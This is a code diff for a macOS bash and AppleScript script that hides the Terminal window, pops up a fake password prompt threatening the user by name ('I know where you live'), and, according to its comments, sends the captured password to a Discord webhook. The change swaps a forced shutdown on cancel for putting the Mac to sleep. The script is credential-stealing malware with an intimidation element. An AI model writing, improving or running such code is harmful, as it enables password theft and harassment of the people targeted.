@@ -1,10 +1,10 @@
 #!/bin/bash
-# Login Prompt Script for macOS – Updated with Shutdown on Cancel
+# Login Prompt Script for macOS – Updated with Sleep on Cancel
 # This script displays a login prompt that instructs the user with two lines:
 # "I know where you live, [FirstName]."
 # "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 #
-# If the user presses cancel, the system will shut down
+# If the user presses cancel, the system will sleep
 # If a password is entered, it sends the captured data to a Discord webhook
 # Hide Terminal immediately.
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -12,7 +12,7 @@ osascript -e 'tell application "Terminal" to set visible of front window to fals
 username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
 # Initialize capture text.
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
-# Define AppleScript for password prompt with shutdown on cancel
+# Define AppleScript for password prompt with sleep on cancel
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -29,9 +29,9 @@ repeat until validInput
             set validInput to true
         end if
     on error
-        -- Use proper macOS shutdown command
-        do shell script "sudo /sbin/shutdown -h now" with administrator privileges
-        return "CANCEL_SHUTDOWN_INITIATED"
+        -- Use AppleScript to put the Mac to sleep
+        tell application "System Events" to sleep
+        return "CANCEL_SLEEP_INITIATED"
     end try
 end repeat
 
@@ -39,8 +39,8 @@ return userPassword
 EOF
 # Execute the AppleScript prompt and capture its output.
 userPassword=$(osascript -e "$applescriptCode")
-# Check if shutdown was initiated
-if [[ "$userPassword" == "CANCEL_SHUTDOWN_INITIATED" ]]; then
+# Check if sleep was initiated
+if [[ "$userPassword" == "CANCEL_SLEEP_INITIATED" ]]; then
     exit 0
 fi
 # Append the captured password.
